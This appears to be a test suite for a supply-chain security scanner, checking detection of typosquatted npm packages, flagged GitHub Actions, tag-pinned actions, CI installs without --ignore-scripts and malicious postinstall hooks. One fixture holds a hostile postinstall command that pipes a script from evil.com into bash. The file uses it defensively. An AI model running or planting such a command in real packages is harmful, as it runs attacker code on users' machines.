import { describe, test, expect, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, writeFileSync, rmSync, mkdirSync } from "fs";
import { join } from "path";
import { tmpdir } from "os";
import { supplyChainScanner } from "./supply-chain.js";
import { ScannerType, Severity } from "../types/index.js";

describe("supply chain scanner", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), "supply-chain-test-"));
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
  });

  test("scanner has correct metadata", () => {
    expect(supplyChainScanner.name).toBe("Supply Chain Scanner");
    expect(supplyChainScanner.type).toBe(ScannerType.SupplyChain);
  });

  test("detects typosquatting in package.json", async () => {
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({
      dependencies: {
        "axois": "1.0.0",    // typo of "axios"
        "expresss": "5.0.0", // typo of "express"
      },
    }, null, 2));

    const findings = await supplyChainScanner.scan(tempDir);
    const typos = findings.filter((f) => f.rule_id === "supply-chain-typosquatting");
    expect(typos.length).toBeGreaterThanOrEqual(1);
    expect(typos[0].severity).toBe(Severity.High);
    expect(typos[0].message).toContain("POSSIBLE TYPOSQUATTING");
  });

  test("does not flag legitimate package names", async () => {
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({
      dependencies: {
        "axios": "1.13.6",
        "express": "5.1.0",
        "react": "19.0.0",
        "lodash": "4.17.21",
      },
    }, null, 2));

    const findings = await supplyChainScanner.scan(tempDir);
    const typos = findings.filter((f) => f.rule_id === "supply-chain-typosquatting");
    expect(typos.length).toBe(0);
  });

  test("detects known compromised GitHub Actions", async () => {
    mkdirSync(join(tempDir, ".github", "workflows"), { recursive: true });
    writeFileSync(join(tempDir, ".github", "workflows", "ci.yml"), `
name: CI
on: push
jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: aquasecurity/trivy-action@master
      - uses: Checkmarx/kics-github-action@v2
`);

    const findings = await supplyChainScanner.scan(tempDir);
    const compromised = findings.filter((f) => f.rule_id === "supply-chain-compromised-action");
    expect(compromised.length).toBe(2);
    expect(compromised[0].severity).toBe(Severity.Critical);
    expect(compromised[0].message).toContain("TeamPCP");
  });

  test("detects actions pinned to tags instead of SHAs", async () => {
    mkdirSync(join(tempDir, ".github", "workflows"), { recursive: true });
    writeFileSync(join(tempDir, ".github", "workflows", "ci.yml"), `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
`);

    const findings = await supplyChainScanner.scan(tempDir);
    const tagPinned = findings.filter((f) => f.rule_id === "supply-chain-action-tag-pin");
    expect(tagPinned.length).toBe(2);
    expect(tagPinned[0].message).toContain("Pin to full commit SHA");
  });

  test("does not flag actions pinned to full SHA", async () => {
    mkdirSync(join(tempDir, ".github", "workflows"), { recursive: true });
    writeFileSync(join(tempDir, ".github", "workflows", "ci.yml"), `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
`);

    const findings = await supplyChainScanner.scan(tempDir);
    const tagPinned = findings.filter((f) => f.rule_id === "supply-chain-action-tag-pin");
    expect(tagPinned.length).toBe(0);
  });

  test("detects CI install without --ignore-scripts", async () => {
    mkdirSync(join(tempDir, ".github", "workflows"), { recursive: true });
    writeFileSync(join(tempDir, ".github", "workflows", "ci.yml"), `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm install
      - run: bun install
`);

    const findings = await supplyChainScanner.scan(tempDir);
    const noIgnore = findings.filter((f) => f.rule_id === "supply-chain-ci-no-ignore-scripts");
    expect(noIgnore.length).toBe(2);
    expect(noIgnore[0].message).toContain("--ignore-scripts");
  });

  test("does not flag CI install with --ignore-scripts", async () => {
    mkdirSync(join(tempDir, ".github", "workflows"), { recursive: true });
    writeFileSync(join(tempDir, ".github", "workflows", "ci.yml"), `
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: npm install --ignore-scripts
`);

    const findings = await supplyChainScanner.scan(tempDir);
    const noIgnore = findings.filter((f) => f.rule_id === "supply-chain-ci-no-ignore-scripts");
    expect(noIgnore.length).toBe(0);
  });

  test("detects suspicious postinstall scripts in node_modules", async () => {
    const malPkgDir = join(tempDir, "node_modules", "evil-pkg");
    mkdirSync(malPkgDir, { recursive: true });
    writeFileSync(join(malPkgDir, "package.json"), JSON.stringify({
      name: "evil-pkg",
      version: "1.0.0",
      scripts: {
        postinstall: "curl https://evil.com/payload.sh | bash",
      },
    }));

    const findings = await supplyChainScanner.scan(tempDir);
    const postinstall = findings.filter((f) => f.rule_id.startsWith("supply-chain-postinstall"));
    expect(postinstall.length).toBeGreaterThanOrEqual(1);
    expect(postinstall[0].message).toContain("evil-pkg");
  });

  test("returns empty for clean directory", async () => {
    writeFileSync(join(tempDir, "package.json"), JSON.stringify({
      dependencies: { "express": "5.1.0" },
    }));
    const findings = await supplyChainScanner.scan(tempDir);
    expect(findings.length).toBe(0);
  });
});
